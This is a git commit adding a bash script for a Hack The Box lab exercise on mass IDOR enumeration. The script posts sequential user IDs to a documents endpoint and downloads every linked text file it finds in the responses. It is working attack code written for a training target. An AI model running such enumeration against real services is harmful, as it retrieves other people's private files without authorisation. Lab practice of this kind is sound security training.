ce9881c273c96acff1280c411a7e3183fbb2b600
Hunter Cartier <huntercartier2@hotmail.com>
2024-10-18 10:13:54 -0700

    Create htb-mass-idor-enum.sh
    To help you complete Hackthebox IDOR enumeration sub-module within the Web Attacks module. The script they provide you does not work and this is an edited version that will work.

---
+++ htb-mass-idor-enum.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+# This script is the edited version that hackthebox gives you to complete the mass IDOR enumeration sub-module within the Web Attacks module. The original script does not work. 
+
+url="http://ip:port" # Edit this line
+
+for i in {1..15}; do
+        response=$(curl -X POST $url/documents.php -d "uid=$i")
+        echo "Response for uid=$i: $response"
+        
+        for link in $(echo "$response" | grep -oP "/documents/[a-zA-Z0-9_]+\.txt"); do
+                echo "Fetching: $url$link"
+                wget -q "$url$link"
+        done
+done
